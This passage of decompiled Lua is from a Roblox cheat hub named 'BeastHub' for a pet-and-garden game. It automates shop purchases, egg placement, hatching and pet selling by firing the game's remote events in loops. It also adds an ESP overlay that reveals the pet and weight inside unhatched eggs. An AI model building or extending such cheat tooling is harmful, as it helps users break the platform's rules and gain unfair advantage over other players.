                    _BeastHubFunctions.buyItemsLive(game:GetService('ReplicatedStorage').GameEvents.BuyPetEgg, u264, u270, function()
                        return _BeastHubFunctions._autoBuySelectedEggsRunning
                    end)
                else
                    warn('[BeastHub] No eggs selected!')
                end
            end
        end,
    })
    _Shops:CreateToggle({
        Name = 'Auto buy all',
        CurrentValue = false,
        Flag = 'autoBuyEggs_all',
        Callback = function(p285)
            _BeastHubFunctions._autoBuyAllEggsRunning = p285

            if p285 then
                _BeastHubFunctions.buyItemsLive(game:GetService('ReplicatedStorage').GameEvents.BuyPetEgg, u264, u268, function()
                    return _BeastHubFunctions._autoBuyAllEggsRunning
                end)
            end
        end,
    })
    _Shops:CreateDivider()
    _Shops:CreateSection('Current Season Pass')
    _Shops:CreateDivider()
    _Shops:CreateSection('Traveling Merchant')

    local function u289()
        local _TravelingMerchantData = game:GetService('ReplicatedStorage'):WaitForChild('Data'):WaitForChild('TravelingMerchant'):WaitForChild('TravelingMerchantData')
        local v287, v288 = pcall(require, _TravelingMerchantData)

        return (not v287 or type(v288) ~= 'table') and {} or v288
    end

    local u290 = u289()

    local function v298(p291)
        local v292 = u290[p291]

        if not v292 or type(v292.ShopData) ~= 'table' then
            return {}
        end

        local v293, v294, v295 = pairs(v292.ShopData)
        local v296 = {}

        while true do
            local v297

            v295, v297 = v293(v294, v295)

            if v295 == nil then
                break
            end

            table.insert(v296, v295 .. ' | ' .. v297.ItemType)
        end

        table.sort(v296)

        return v296
    end

    local v304 = (function()
        local v299, v300, v301 = pairs(u290)
        local v302 = {}

        while true do
            local v303

            v301, v303 = v299(v300, v301)

            if v301 == nil then
                break
            end

            table.insert(v302, v301)
        end

        table.sort(v302)

        return v302
    end)()
    local v305, v306, v307 = ipairs(v304)
    local u308 = u290
    local u309 = {}
    local u310 = {}

    while true do
        local u311

        v307, u311 = v305(v306, v307)

        if v307 == nil then
            break
        end

        u309[u311] = {}
        u310[u311] = _Shops:CreateDropdown({
            Name = u311,
            Options = v298(u311),
            CurrentOption = {},
            MultipleOptions = true,
            Flag = 'dropdown_' .. u311:gsub(' ', ''),
            Callback = function(p312)
                u309[u311] = p312
            end,
        })
    end

    local v313, v314, v315 = ipairs({
        'Gear',
        'Seed',
        'Crate',
        'Egg',
        'Pet',
        'Cosmetic',
        'Seed Pack',
        'Fence',
    })

    while true do
        local u316

        v315, u316 = v313(v314, v315)

        if v315 == nil then
            break
        end

        _Shops:CreateButton({
            Name = 'Select All ' .. u316,
            Callback = function()
                local v317, v318, v319 = pairs(u310)

                while true do
                    local v320, v321 = v317(v318, v319)

                    if v320 == nil then
                        break
                    end

                    local v322 = v321.Options or {}
                    local v323 = u309[v320] or {}
                    local v324, v325, v326 = ipairs(v323)

                    v319 = v320

                    local v327 = {}

                    while true do
                        local v328

                        v326, v328 = v324(v325, v326)

                        if v326 == nil then
                            break
                        end

                        v327[v328] = true
                    end

                    local v329, v330, v331 = ipairs(v322)

                    while true do
                        local v332

                        v331, v332 = v329(v330, v331)

                        if v331 == nil then
                            break
                        end
                        if string.match(v332, '%|%s*' .. u316 .. '$') and not v327[v332] then
                            table.insert(v323, v332)

                            v327[v332] = true
                        end
                    end

                    v321:Set(v323)

                    u309[v320] = v323
                end
            end,
        })
    end

    _Shops:CreateButton({
        Name = 'Clear All Selections',
        Callback = function()
            local v333, v334, v335 = pairs(u310)

            while true do
                local v336

                v335, v336 = v333(v334, v335)

                if v335 == nil then
                    break
                end

                v336:Set({})

                u309[v335] = {}
            end
        end,
    })

    local u337 = false
    local u338 = nil

    _Shops:CreateToggle({
        Name = 'Auto Buy Traveling Merchant',
        CurrentValue = false,
        Flag = 'autoBuyTravelingMerchant',
        Callback = function(p339)
            u337 = p339

            if u337 then
                if u338 then
                    return
                end

                local function u340()
                    return require(game:GetService('ReplicatedStorage').Modules.DataService):GetData().TravelingMerchantShopStock
                end

                u340()

                u338 = task.spawn(function()
                    u308 = u289()

                    while u337 do
                        local v341 = u340()
                        local _MerchantType = v341.MerchantType
                        local v343 = u309[_MerchantType]

                        if v343 and u308[_MerchantType] then
                            local _ShopData = u308[_MerchantType].ShopData
                            local _Stocks = v341.Stocks
                            local v346, v347, v348 = ipairs(v343)

                            while true do
                                local v349

                                v348, v349 = v346(v347, v348)

                                if v348 == nil then
                                    break
                                end

                                local v350 = string.match(v349, '^(.-)%s|')

                                if v350 then
                                    local v351 = _Stocks[v350]

                                    if v351 and _ShopData[v350] and v351.Stock > 0 then
                                        for _ = 1, v351.Stock do
                                            game:GetService('ReplicatedStorage').GameEvents.BuyTravelingMerchantShopStock:FireServer(unpack({v350}))
                                            task.wait(0.15)
                                        end
                                    end
                                end
                            end
                        end

                        task.wait(2)
                    end

                    u338 = nil
                end)
            else
                u337 = false

                if u338 then
                    u338 = nil
                end
            end
        end,
    })
    _Shops:CreateDivider()
    _Eggs:CreateSection('Auto Place eggs')

    local u361 = (function()
        local u352 = {}
        local v359, v360 = pcall(function()
            local _ReplicatedStorage5 = game:GetService('ReplicatedStorage')
            local v354 = require(_ReplicatedStorage5.Data.PetRegistry)

            if v354.PetEggs then
                local v355, v356, v357 = pairs(v354.PetEggs)

                while true do
                    local v358

                    v357, v358 = v355(v356, v357)

                    if v357 == nil then
                        break
                    end
                    if v357 ~= 'Fake Egg' then
                        table.insert(u352, v357)
                    end
                end
            else
                warn('PetRegistry.PetEggs not found!')
            end
        end)

        if not v359 then
            warn('getEggNames failed:', v360)
        end

        return u352
    end)()

    table.sort(u361)

    local function u362()
        return #_BeastHubFunctions.getMyFarmPetEggs()
    end

    local u363 = {}
    local u365 = _Eggs:CreateDropdown({
        Name = 'Select Egg to Auto Place',
        Options = u361,
        CurrentOption = {},
        MultipleOptions = false,
        Flag = 'eggToAutoPlace',
        Callback = function(p364)
            u363 = p364
        end,
    })
    local u366 = nil

    _Eggs:CreateInput({
        Name = 'Search',
        PlaceholderText = 'Search Egg...',
        RemoveTextAfterFocusLost = false,
        Callback = function(p367)
            if u366 then
                task.cancel(u366)
            end

            u366 = task.delay(0.5, function()
                local v368 = {}
                local v369 = string.lower(p367)

                if v369 == '' then
                    v368 = u361
                else
                    local v370, v371, v372 = ipairs(u361)

                    while true do
                        local v373

                        v372, v373 = v370(v371, v372)

                        if v372 == nil then
                            break
                        end
                        if string.find(string.lower(v373), v369, 1, true) then
                            table.insert(v368, v373)
                        end
                    end
                end

                u365:Refresh(v368)
                u365:Set(u363)
            end)
        end,
    })

    local u374 = 13

    _Eggs:CreateInput({
        Name = 'Number of eggs to place',
        CurrentValue = '13',
        PlaceholderText = '# of eggs',
        RemoveTextAfterFocusLost = false,
        Flag = 'numberOfEggsToPlace',
        Callback = function(p375)
            u374 = tonumber(p375) or 0
        end,
    })

    local u376 = _Eggs:CreateInput({
        Name = 'Delay to place eggs (default 0.5)',
        CurrentValue = '0.5',
        PlaceholderText = 'seconds',
        RemoveTextAfterFocusLost = false,
        Flag = 'delayOfEggsToPlace',
        Callback = function(_) end,
    })
    local u377 = _Eggs:CreateInput({
        Name = 'Delay to hatch eggs (default 2)',
        CurrentValue = '2',
        PlaceholderText = 'seconds',
        RemoveTextAfterFocusLost = false,
        Flag = 'delayToHatch',
        Callback = function(_) end,
    })

    _Eggs:CreateDropdown({
        Name = 'Position',
        Options = {
            'Left - spread out',
            'Right - spread out',
            'Left - stacked',
            'Right - stacked',
        },
        CurrentOption = {
            'Left - spread out',
        },
        MultipleOptions = false,
        Flag = 'positionPlaceEggs',
        Callback = function(p378)
            u175 = p378[1]
        end,
    })

    local u379 = nil
    local u380 = false
    local u381 = false
    local u382 = 0
    local u383 = 0
    local u384 = '(1st hatch not counted)'
    local u385 = 0
    local u386 = ''
    local u387 = false

    game:GetService('ReplicatedStorage').GameEvents.Notification.OnClientEvent:Connect(function(p388)
        if typeof(p388) == 'string' and p388:lower():find('too close to another egg') then
            u380 = true
        end
        if typeof(p388) == 'string' and p388:lower():find('a pet is already in the machine!') then
            u381 = true
        end
        if typeof(p388) == 'string' and p388:lower():find('lucky hatch') then
            u382 = u382 + 1
        end
        if typeof(p388) == 'string' and p388:lower():find('lucky pet') then
            u383 = u383 + 1
        end
        if typeof(p388) == 'string' and p388:lower():find('you cannot open this pet') then
            u385 = u385 + 1
        end

        local v389 = nil

        if typeof(p388) ~= 'string' then
            if typeof(p388) == 'table' and typeof(p388.Text) == 'string' then
                v389 = p388.Text
            end
        else
            v389 = p388
        end
        if v389 and v389:lower():find('mutated into') then
            u386 = v389

            if u387 == true then
                u22(u379, '[BeastHub] ' .. u67 .. ' | Auto Mutation Machine result: ' .. (v389:match('.*>([^<]-)</font>%s*$') or v389))
            end
        end
    end)

    local u390 = nil
    local u391 = false
    local u392 = false
    local u403 = _Eggs:CreateToggle({
        Name = 'Auto place eggs',
        CurrentValue = false,
        Flag = 'autoPlaceEggs',
        Callback = function(p393)
            if u390 then
                u391 = false
                u390 = nil
            end

            local v394 = tick()
            local v395 = 10

            while not getgenv().ConfigLoaded do
                if v395 <= tick() - v394 then
                    u11('Auto place egg UI failed to load, please rejoin', '', 5)

                    break
                end

                task.wait(0.5)
            end

            task.wait(3)

            if p393 then
                u11('Auto place eggs: ON', 'Max Eggs to place: ' .. tostring(u374), 4)

                u391 = true

                local u396 = u136()

                u390 = task.spawn(function()
                    while true do
                        if not u391 then
                            return
                        end

                        local v397 = u374

                        if u362() >= v397 then
                            u392 = true
                        else
                            local v398, v399, v400 = ipairs(u396)

                            while true do
                                local v401

                                v400, v401 = v398(v399, v400)

                                if v400 == nil then
                                    break
                                end

                                local v402 = u362()

                                if v397 <= v402 then
                                    break
                                end
                                if u365.CurrentOption[1] then
                                    u113(u365.CurrentOption[1])
                                    task.wait()
                                end

                                game:GetService('ReplicatedStorage').GameEvents.PetEggService:FireServer(unpack({
                                    'CreateEgg',
                                    v401,
                                }))
                                task.wait(tonumber(u376.CurrentValue) or 0.5)

                                if u380 then
                                    u380 = false
                                else
                                    local _ = v402 + 1
                                end
                            end
                        end

                        task.wait(1.5)
                    end
                end)
            else
                u391 = false
                u390 = nil
            end
        end,
    })

    _Eggs:CreateButton({
        Name = 'Click to HATCH ALL',
        Callback = function()
            print('[BeastHub] Hatching eggs...')

            local _PetEggService = game:GetService('ReplicatedStorage'):WaitForChild('GameEvents'):WaitForChild('PetEggService')
            local v405 = _BeastHubFunctions.getMyFarmPetEggs()

            if #v405 ~= 0 then
                local v406, v407, v408 = ipairs(v405)

                while true do
                    local v409

                    v408, v409 = v406(v407, v408)

                    if v408 == nil then
                        break
                    end

                    _PetEggService:FireServer(unpack({
                        'HatchPet',
                        v409,
                    }))
                    task.wait(0.05)
                end
            end
        end,
    })
    _Eggs:CreateDivider()

    local u410 = {}
    local u411 = nil
    local u412 = _Eggs:CreateParagraph({
        Title = 'Auto Sell Pets:',
        Content = 'No pets selected.',
    })
    local u414 = _Eggs:CreateDropdown({
        Name = "Select 'Seals' loadout",
        Options = getgenv().preloadedCustomLoadoutNames or {},
        CurrentOption = {},
        MultipleOptions = false,
        Flag = 'sealsLoadoutNum',
        Callback = function(p413)
            u411 = p413[1]
        end,
    })
    local u415 = {
        'Ostrich',
        'Peacock',
        'Capybara',
        'Scarlet Macaw',
        'Bat',
        'Bone Dog',
        'Spider',
        'Black Cat',
        'Oxpecker',
        'Zebra',
        'Giraffe',
        'Rhino',
        'Tree Frog',
        'Hummingbird',
        'Iguana',
        'Chimpanzee',
        'Robin',
        'Badger',
        'Grizzly Bear',
        'Ladybug',
        'Pixie',
        'Imp',
        'Glimmering Sprite',
        'Dairy Cow',
        'Jackalope',
        'Seedling',
        'Orange Tabby',
        'Spotted Deer',
        'Pig',
        'Rooster',
        'Monkey',
        'Black Bunny',
        'Chicken',
        'Cat',
        'Deer',
        'Cow',
        'Silver Monkey',
        'Sea Otter',
        'Turtle',
        'Bagel Bunny',
        'Pancake Mole',
        'Sushi Bear',
        'Spaghetti Sloth',
        'Shiba Inu',
        'Nihonzaru',
        'Tanuki',
        'Tanchozuru',
        'Kappa',
        'Parasaurolophus',
        'Iguanodon',
        'Ankylosaurus',
        'Raptor',
        'Triceratops',
        'Stegosaurus',
        'Pterodactyl',
        'Flamingo',
        'Toucan',
        'Sea Turtle',
        'Orangutan',
        'Wasp',
        'Tarantula Hawk',
        'Moth',
        'Bee',
        'Honey Bee',
        'Petal Bee',
        'Hedgehog',
        'Mole',
        'Frog',
        'Echo Frog',
        'Night Owl',
        'Caterpillar',
        'Snail',
        'Giant Ant',
        'Praying Mantis',
        'Topaz Snail',
        'Amethyst Beetle',
        'Emerald Snake',
        'Sapphire Macaw',
        'Turtle Dove',
        'Reindeer',
        'Nutcracker',
        'Partridge',
        'Santa Bear',
        'Moose',
        'Frost Squirrel',
        "New Year's Bird",
        'Firework Sprite',
        'Celebration Puppy',
        "New Year's Chimp",
        'Star Wolf',
        'Unicycle Monkey',
        'Performer Seal',
        'Bear on Bike',
        'Show Pony',
        'Dog',
        'Golden Lab',
        'Bunny',
        'Starfish',
        'Seagull',
        'Crab',
        'Black Bird',
        'Cuckoo',
        'Brown Owl',
        'Gold Finch',
        'Grey Mouse',
        'Brown Mouse',
        'Red Giant Ant',
        'Squirrel',
        'Chocolate Bunny',
        'Easter Egg Chick',
        'Marshmallow Lamb',
        'Spring Bee',
        'Jerboa',
        'Nyala',
        'Bumblebee',
        'Nurse Bee',
        'Gardener Bee',
        'Elemental Bee',
        'Cicada',
        'Newt',
        'Nightjar',
        'Sea Anemone',
        'Seahorse',
        'Hermit Crab',
    }
    local u416 = {}
    local u423 = _Eggs:CreateDropdown({
        Name = 'Select Pets for Auto Sell',
        Options = u163,
        CurrentOption = {},
        MultipleOptions = true,
        Flag = 'autoSellPetsSelection',
        Callback = function(p417)
            u410 = p417

            local v418 = table.concat(p417, ', ')

            u412:Set({
                Title = 'Auto Sell Pets:',
                Content = v418 == '' and 'No pets selected.' or v418,
            })
            table.clear(u416)

            local v419, v420, v421 = ipairs(p417)

            while true do
                local v422

                v421, v422 = v419(v420, v421)

                if v421 == nil then
                    break
                end

                u416[v422] = true
            end
        end,
    })
    local u424 = nil

    _Eggs:CreateInput({
        Name = 'Search',
        PlaceholderText = 'Search Pet...',
        RemoveTextAfterFocusLost = false,
        Callback = function(p425)
            if u424 then
                task.cancel(u424)
            end

            u424 = task.delay(0.5, function()
                local v426 = {}
                local v427 = string.lower(p425)

                if v427 == '' then
                    v426 = u163
                else
                    local v428, v429, v430 = ipairs(u163)

                    while true do
                        local v431

                        v430, v431 = v428(v429, v430)

                        if v430 == nil then
                            break
                        end
                        if string.find(string.lower(v431), v427, 1, true) then
                            table.insert(v426, v431)
                        end
                    end
                end

                u423:Refresh(v426)
                u423:Set(u410)
            end)
        end,
    })

    local u432 = _Eggs:CreateInput({
        Name = 'Delay to Sell (default 2)',
        CurrentValue = '2',
        PlaceholderText = 'seconds',
        RemoveTextAfterFocusLost = false,
        Flag = 'delayToSell',
        Callback = function(_) end,
    })

    _Eggs:CreateButton({
        Name = 'Load Suggested List',
        Callback = function()
            u423:Set(u415)

            u410 = u415
        end,
    })
    _Eggs:CreateButton({
        Name = 'Clear selection',
        Callback = function()
            u423:Set({})

            u410 = {}
        end,
    })

    local u433 = nil

    _Eggs:CreateDropdown({
        Name = 'Sell All Below KG Mode',
        Options = {
            'Current KG',
            'Base KG',
        },
        CurrentOption = {
            'Current KG',
        },
        MultipleOptions = false,
        Flag = 'sellAllBelowKGmode',
        Callback = function(p434)
            u433 = p434[1]
        end,
    })

    local u435 = nil
    local u438 = _Eggs:CreateInput({
        Name = 'Sell Below (KG or Base KG)',
        CurrentValue = '3',
        PlaceholderText = 'Input Placeholder',
        RemoveTextAfterFocusLost = false,
        Flag = 'sellBelowKG',
        Callback = function(p436)
            local v437 = tonumber(p436)

            if v437 then
                u435 = v437
            else
                u435 = 3
            end
        end,
    })

    local function u478(p439, p440, p441)
        local _Data = (function()
            return require(game:GetService('ReplicatedStorage').Modules.DataService):GetData()
        end)().PetsData.PetInventory.Data
        local v443, v444, v445 = pairs(_Data)
        local v446 = {}
        local v447 = {}

        while true do
            local v448

            v445, v448 = v443(v444, v445)

            if v445 == nil then
                break
            end
            if v448 and v448.PetType and (v448.PetData and not v448.PetData.IsFavorite) then
                local _BaseWeight = v448.PetData.BaseWeight

                v446[v445] = true
                v447[v445] = _BaseWeight
            end
        end

        u191.isSafeToPickPlace = false

        local _LocalPlayer7 = game.Players.LocalPlayer
        local _Backpack4 = _LocalPlayer7:WaitForChild('Backpack')

        _LocalPlayer7.Character.Humanoid:UnequipTools()
        u11('Sell delay: ' .. (tostring(u432.CurrentValue) or ''), '', 3)
        task.wait(tonumber(u432.CurrentValue) or 2)

        local v452, v453, v454 = pairs(_Data)
        local v455 = {}

        while true do
            while true do
                local v456, v457 = v452(v453, v454)

                if v456 == nil then
                    local v458, v459, v460 = ipairs(v455)
                    local v461 = {}

                    while true do
                        local v462

                        v460, v462 = v458(v459, v460)

                        if v460 == nil then
                            break
                        end

                        v461[v462] = true
                    end

                    local v463, v464, v465 = ipairs(_Backpack4:GetChildren())

                    while true do
                        local v466

                        v465, v466 = v463(v464, v465)

                        if v465 == nil then
                            break
                        end

                        local _b = v466:GetAttribute('b')
                        local _d = v466:GetAttribute('d')

                        if _b == 'l' and _d == false then
                            local _PET_UUID = v466:GetAttribute('PET_UUID')
                            local _ddsKkGg = v466.Name:match('%[(%d+%.?%d*)%s*[Kk][Gg]%]')

                            if _ddsKkGg then
                                _ddsKkGg = tonumber(_ddsKkGg)
                            end
                            if u433 == 'Base KG' then
                                _ddsKkGg = (v447[_PET_UUID] or 0) * 1.1
                            end
                            if v461[_PET_UUID] and _ddsKkGg and _ddsKkGg < p440 then
                                game:GetService('ReplicatedStorage').GameEvents.SellPetShopSelected:FireServer(v466)
                                task.wait(0.05)
                            end
                        end
                    end

                    if typeof(p441) == 'function' then
                        p441()
                    end

                    return
                end

                local _PetType = v457.PetType

                if (v457.PetData.IsFavorite or '') ~= true then
                    break
                end

                v454 = v456
            end

            local v472 = tonumber(string.format('%.2f', v457.PetData.BaseWeight * 1.1)) or 0

            if u433 == 'Base KG' then
                v472 = v447[v456] * 1.1
            end
            if v472 == 0 then
                warn('Weight error for: ' .. (tostring(v456) or 'nil id'))
            end

            local v473, v474, v475 = ipairs(p439)

            v454 = v456

            local v476 = false

            while true do
                local v477

                v475, v477 = v473(v474, v475)

                if v475 == nil then
                    break
                end
                if _PetType == v477 then
                    v476 = true

                    break
                end
            end

            if v476 and v472 and v472 < p440 then
                table.insert(v455, v456)
            end
        end
    end
    local function u504()
        u11('Validating SELL ALL safety..', 'Please wait', 5)

        local _LocalPlayer8 = game.Players.LocalPlayer

        _LocalPlayer8.Character.Humanoid:UnequipTools()

        local _Favorite_Item = game:GetService('ReplicatedStorage').GameEvents.Favorite_Item
        local _Backpack5 = _LocalPlayer8:WaitForChild('Backpack')
        local v482 = {}
        local v483 = {}
        local v484 = tick()

        u435 = tonumber(u438.CurrentValue)

        local v489 = (function()
            local v485, u486 = pcall(function()
                return require(game:GetService('ReplicatedStorage').Modules.DataService)
            end)

            if v485 and u486 then
                local v487, v488 = pcall(function()
                    return u486:GetData()
                end)

                if v487 then
                    return v488
                else
                    return nil
                end
            else
                return nil
            end
        end)()

        if not (v489 and (v489.PetsData and v489.PetsData.PetInventory) and v489.PetsData.PetInventory.Data) then
            return false
        end

        local _Data2 = v489.PetsData.PetInventory.Data
        local v491, v492, v493 = pairs(_Data2)

        while true do
            local v494

            v493, v494 = v491(v492, v493)

            if v493 == nil then
                break
            end
            if v494 and v494.PetType and (v494.PetData and not v494.PetData.IsFavorite) then
                local _BaseWeight2 = v494.PetData.BaseWeight

                v482[v493] = true
                v483[v493] = _BaseWeight2
            end
        end

        local v496, v497, v498 = ipairs(_Backpack5:GetChildren())

        while true do
            local v499

            v498, v499 = v496(v497, v498)

            if v498 == nil then
                break
            end

            local _PET_UUID2 = v499:GetAttribute('PET_UUID')
            local _d2 = v499:GetAttribute('d')

            if _PET_UUID2 and v482[_PET_UUID2] then
                local v502 = tonumber(v499.Name:match('%[(%d+%.?%d*)%s*[Kk][Gg]%]'))

                if u433 == 'Base KG' then
                    v502 = v483[_PET_UUID2] * 1.1
                end

                local _s = v499.Name:match('^(.-)%s*%[')

                if _s and string.find(_s, 'Peppermint', 1, true) then
                    _s = _s:gsub('Peppermint', ''):gsub('^%s+', ''):gsub('%s+$', '')
                end
                if _s and string.find(_s, 'SpiritSparkle', 1, true) then
                    _s = _s:gsub('SpiritSparkle', ''):gsub('^%s+', ''):gsub('%s+$', '')
                end
                if _s and string.find(_s, 'Blossoming', 1, true) then
                    _s = _s:gsub('Blossoming', ''):gsub('^%s+', ''):gsub('%s+$', '')
                end
                if _d2 == false and not u416[_s] then
                    u11('Favorited: ' .. _s, 'Size: ' .. v502, 5)
                    _Favorite_Item:FireServer(v499)
                    task.wait(2)
                elseif _d2 == false and u435 < v502 then
                    u11('Favorited: ' .. _s, 'Size: ' .. v502, 5)
                    _Favorite_Item:FireServer(v499)
                    task.wait(2)
                end
            end
            if tick() - v484 >= 2 then
                u11('Processing items... (' .. v498 .. '/' .. #_Backpack5:GetChildren() .. ')', '', 2)

                v484 = tick()
            end

            task.wait()
        end

        return true
    end

    _Eggs:CreateParagraph({
        Title = 'Sell All Method',
        Content = 'This will auto fav pets that are not in sell list during selling part',
    })

    local u505 = _Eggs:CreateToggle({
        Name = 'Use SELL ALL (WARNING, FAVORITE YOUR PETS!)',
        CurrentValue = false,
        Flag = 'useSellAllMethod',
        Callback = function(_) end,
    })
    local u506 = _Eggs:CreateInput({
        Name = 'Hatch/Sell cycles (0 = sell when full) ',
        CurrentValue = '0',
        PlaceholderText = '#',
        RemoveTextAfterFocusLost = false,
        Flag = 'hatchCyclesBeforeSell',
        Callback = function(_) end,
    })

    _Eggs:CreateDivider()
    _Eggs:CreateSection('SMART Auto Hatching')
    _Eggs:CreateParagraph({
        Title = 'INSTRUCTIONS:',
        Content = '1.) Setup your Auto place Eggs above and turn on toggle for auto place eggs.\n2.) Setup your selected pets for Auto Sell above.\n3.) Selected designated loadouts below.\n4.) Turn on BeastHub Egg ESP',
    })

    local u507 = nil
    local u508 = nil
    local u509 = nil
    local u510 = nil
    local u511 = 0
    local v512 = {
        unpack(getgenv().preloadedCustomLoadoutNames),
    }

    table.insert(v512, 1, '9 pets tech')

    local u514 = _Eggs:CreateDropdown({
        Name = 'Incubating/Eagles Loadout',
        Options = v512 or {},
        CurrentOption = {},
        MultipleOptions = false,
        Flag = 'incubatingLoadoutNum',
        Callback = function(p513)
            u508 = p513[1]
        end,
    })
    local u516 = _Eggs:CreateDropdown({
        Name = 'Koi Loadout',
        Options = getgenv().preloadedCustomLoadoutNames or {},
        CurrentOption = {},
        MultipleOptions = false,
        Flag = 'koiLoadoutNum',
        Callback = function(p515)
            u507 = p515[1]
        end,
    })
    local u517 = _Eggs:CreateParagraph({
        Title = 'Anti Hatch Pets (HUGE are all default anti hatched):',
        Content = 'No pets selected.',
    })
    local u518 = {}
    local u525 = _Eggs:CreateDropdown({
        Name = 'Anti Hatch Pets:',
        Options = u163,
        CurrentOption = {},
        MultipleOptions = true,
        Flag = 'antiHatchPetsSelection',
        Callback = function(p519)
            u518 = {}

            local v520, v521, v522 = ipairs(p519)

            while true do
                local v523

                v522, v523 = v520(v521, v522)

                if v522 == nil then
                    break
                end

                table.insert(u518, v523)
            end

            local v524 = table.concat(u518, ', ')

            u517:Set({
                Title = 'Anti Hatch Pets (HUGE by default are skipped):',
                Content = v524 == '' and 'No pets selected.' or v524,
            })
        end,
    })
    local u526 = nil

    _Eggs:CreateInput({
        Name = 'Search',
        PlaceholderText = 'Search Pet...',
        RemoveTextAfterFocusLost = false,
        Callback = function(p527)
            if u526 then
                task.cancel(u526)
            end

            u526 = task.delay(0.5, function()
                local v528 = {}
                local v529 = string.lower(p527)

                if v529 == '' then
                    v528 = u163
                else
                    local v530, v531, v532 = ipairs(u163)

                    while true do
                        local v533

                        v532, v533 = v530(v531, v532)

                        if v532 == nil then
                            break
                        end
                        if string.find(string.lower(v533), v529, 1, true) then
                            table.insert(v528, v533)
                        end
                    end
                end

                u525:Refresh(v528)
                u525:Set(u518)

                if #v528 == 0 then
                    u517:Set({
                        Title = 'Anti Hatch Pets (HUGE by default are skipped):',
                        Content = 'No pets selected.',
                    })
                end
            end)
        end,
    })
    _Eggs:CreateButton({
        Name = 'Clear Anti Hatch',
        Callback = function()
            u525:Set({})

            u518 = {}

            u517:Set({
                Title = 'Anti Hatch Pets (HUGE by default are skipped):',
                Content = 'No pets selected.',
            })
        end,
    })

    local u534 = '0'

    _Eggs:CreateDropdown({
        Name = 'Anti Hatch Above KG:',
        Options = {
            '0',
            '1',
            '1.5',
            '1.6',
            '1.7',
            '1.8',
            '1.9',
            '2',
            '2.1',
            '2.2',
            '2.3',
            '2.4',
            '2.5',
        },
        CurrentOption = {
            '0',
        },
        MultipleOptions = false,
        Flag = 'skipHatchRareAboveKG',
        Callback = function(p535)
            u534 = tonumber(p535[1])
        end,
    })
    task.wait(0.5)

    local u536 = false

    _Eggs:CreateToggle({
        Name = 'Auto Bronto Huge?',
        CurrentValue = false,
        Flag = 'autoBrontoHuge',
        Callback = function(p537)
            u536 = p537
        end,
    })

    local u538 = false

    _Eggs:CreateToggle({
        Name = 'Auto Bronto Anti Hatch list?',
        CurrentValue = false,
        Flag = 'autoBrontoAntiHatch',
        Callback = function(p539)
            u538 = p539
        end,
    })

    local u540 = nil
    local u542 = _Eggs:CreateDropdown({
        Name = 'Select Bronto loadout',
        Options = getgenv().preloadedCustomLoadoutNames or {},
        CurrentOption = {},
        MultipleOptions = false,
        Flag = 'brontoLoadoutNum',
        Callback = function(p541)
            u540 = p541[1]
        end,
    })
    local u543 = false
    local u544 = nil

    _Eggs:CreateToggle({
        Name = 'BeastHub ESP',
        CurrentValue = false,
        Flag = 'bhubESP',
        Callback = function(p545)
            u543 = p545

            if u543 or not u544 then
                if u543 and not u544 then
                    u544 = task.spawn(function()
                        while u543 do
                            local v546 = _BeastHubFunctions.getMyFarmPetEggs()
                            local v547, v548, v549 = ipairs(v546)
                            local v550 = 0
                            local v551 = {}

                            while true do
                                local v552

                                v549, v552 = v547(v548, v549)

                                if v549 == nil then
                                    break
                                end
                                if v552:FindFirstChild('BhubESP') then
                                    v550 = v550 + 1
                                end
                            end

                            if v550 == #v546 then
                                task.wait(2)
                            else
                                if #v546 == 0 then
                                    return
                                end

                                local function u553()
                                    return require(game:GetService('ReplicatedStorage').Modules.DataService):GetData()
                                end

                                local v555 = (function()
                                    local v554 = u553()

                                    if v554.SaveSlots then
                                        return v554.SaveSlots
                                    end

                                    warn('SaveSlots not found!')

                                    return nil
                                end)()
                                local _SelectedSlot = v555.SelectedSlot
                                local _AllSlots = v555.AllSlots
                                local v558, v559, v560 = pairs(_AllSlots)

                                while true do
                                    local v561

                                    v560, v561 = v558(v559, v560)

                                    if v560 == nil then
                                        break
                                    end
                                    if tostring(v560) == _SelectedSlot then
                                        local _SavedObjects = v561.SavedObjects
                                        local v563, v564, v565 = pairs(_SavedObjects)

                                        while true do
                                            local v566

                                            v565, v566 = v563(v564, v565)

                                            if v565 == nil then
                                                break
                                            end
                                            if v566.ObjectType == 'PetEgg' then
                                                local _Data3 = v566.Data

                                                if (_Data3.TimeToHatch or 0) == 0 then
                                                    local v568 = {
                                                        Uid = v565,
                                                        PetName = _Data3.RandomPetData.Name,
                                                        PetKG = string.format('%.2f', _Data3.BaseWeight * 1.1),
                                                        rawKG = _Data3.BaseWeight * 1.1,
                                                    }

                                                    table.insert(v551, v568)
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            local v569, v570, v571 = ipairs(v546)

                            while true do
                                local v572

                                v571, v572 = v569(v570, v571)

                                if v571 == nil then
                                    break
                                end
                                if v572:IsA('Model') then
                                    local _OBJECT_UUID = v572:GetAttribute('OBJECT_UUID')
                                    local v574, v575, v576 = pairs(v551)
                                    local v577 = nil
                                    local v578 = 3
                                    local v579 = nil
                                    local v580 = nil
                                    local v581 = false

                                    while true do
                                        local v582

                                        v576, v582 = v574(v575, v576)

                                        if v576 == nil then
                                            break
                                        end
                                        if _OBJECT_UUID == v582.Uid then
                                            v580 = v582.PetName
                                            v577 = v582.PetKG
                                            v579 = v582.rawKG
                                        end
                                    end

                                    if v577 then
                                        local v583 = v578 <= v579 and true or v581
                                        local _BhubESP = v572:FindFirstChild('BhubESP')

                                        if _BhubESP then
                                            _BhubESP:Destroy()
                                        end

                                        local _Folder = Instance.new('Folder')

                                        _Folder.Name = 'BhubESP'
                                        _Folder.Parent = v572

                                        local _BillboardGui = Instance.new('BillboardGui')

                                        _BillboardGui.Name = 'EggBillboard'
                                        _BillboardGui.Adornee = v572
                                        _BillboardGui.Size = UDim2.new(0, 150, 0, 40)
                                        _BillboardGui.AlwaysOnTop = true
                                        _BillboardGui.StudsOffset = Vector3.new(0, 4, 0)
                                        _BillboardGui.Parent = _Folder

                                        local _TextLabel = Instance.new('TextLabel')

                                        _TextLabel.RichText = true
                                        _TextLabel.BackgroundTransparency = 1
                                        _TextLabel.Size = UDim2.new(1, 0, 1, 0)

                                        if v583 then
                                            if v579 < 5 then
                                                _TextLabel.Text = '<font color="rgb(255,0,0)"><b>ARAY KO!</b></font>\n<font color="rgb(0,255,0)">' .. v580 .. '</font> = ' .. v577 .. 'kg'
                                            elseif v579 < 8 then
                                                _TextLabel.Text = '<font color="rgb(255,0,0)"><b>PALDO! (' .. string.format('%.2f', v579 * 1.3) .. 'kg)</b></font>\n<font color="rgb(0,255,0)">' .. v580 .. '</font> = ' .. v577 .. 'kg'
                                            else
